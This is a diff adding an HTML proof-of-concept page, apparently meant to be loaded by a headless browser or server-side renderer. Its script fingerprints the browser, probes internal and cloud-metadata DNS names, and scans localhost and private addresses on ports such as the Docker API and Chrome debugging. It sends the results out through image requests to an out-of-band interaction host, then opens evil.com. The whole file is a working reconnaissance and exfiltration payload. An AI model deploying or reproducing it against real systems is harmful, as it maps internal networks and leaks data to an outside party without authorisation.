@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Fingerprint and redirect PoC</title>
+</head>
+<body>
+  <h1>Fingerprinting and Redirecting...</h1>
+  <p>Probing internal network and cloud metadata...</p>
+
+<script>
+(function() {
+  // Reliable exfil method using <img> (no CORS/preflight issues)
+  const exfil = (path, data) => {
+    const img = new Image();
+    img.src = 'http://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun' + path + '?d=' + encodeURIComponent(data);
+  };
+
+  // === [1] DNS Rebinding / Internal Resolution Test ===
+  const internalDnsNames = [
+    'internal-service.local',
+    'internal-api.default.svc.cluster.local',
+    'api.internal',
+    'vault.service.consul',
+    'metadata.google.internal',
+    'host.docker.internal'
+  ];
+
+  internalDnsNames.forEach(name => {
+    let img = new Image();
+    img.src = 'http://' + name + '.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/ping';
+  });
+
+  // === [2] Browser Fingerprinting ===
+  exfil('/fingerprint', JSON.stringify({
+    ua: navigator.userAgent,
+    webdriver: navigator.webdriver,
+    plugins: navigator.plugins.length,
+    languages: navigator.languages,
+    screen: { w: screen.width, h: screen.height },
+    platform: navigator.platform,
+    doNotTrack: navigator.doNotTrack,
+    vendor: navigator.vendor
+  }));
+
+  // === [3] Internal Port Scan ===
+  const ips = ['127.0.0.1', 'localhost', '172.17.0.1', '10.0.0.1'];
+  const ports = [80, 3000, 5000, 8000, 8080, 8443, 2375, 9200, 9222];
+
+  ips.forEach(ip => {
+    ports.forEach(port => {
+      let img = new Image();
+      img.src = `http://${ip}:${port}/favicon.ico`;
+      img.onload = () => exfil('/open_port', `${ip}:${port}`);
+      img.onerror = () => {};
+    });
+  });
+})();
+
+window.open('https://www.evil.com', '_blank');
+
+</script>
+
+</body>
+</html>
